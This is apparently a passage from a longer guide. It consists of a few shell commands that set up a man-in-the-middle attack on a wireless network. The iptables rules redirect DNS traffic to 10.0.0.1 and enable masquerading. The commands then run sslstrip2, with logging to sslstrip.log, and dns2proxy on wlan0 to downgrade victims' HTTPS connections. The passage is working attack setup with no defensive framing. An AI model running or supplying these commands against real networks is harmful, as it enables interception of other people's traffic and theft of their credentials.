...
iptables --table nat --append PREROUTING --protocol udp --destination-port 53 --jump DNAT --to 10.0.0.1

iptables --table nat --append POSTROUTING --jump MASQUERADE

python ./sslstrip2/sslstrip.py -l 10000 -p -w ./sslstrip.log &
python ./dns2proxy/dns2proxy.py -i wlan0 & 
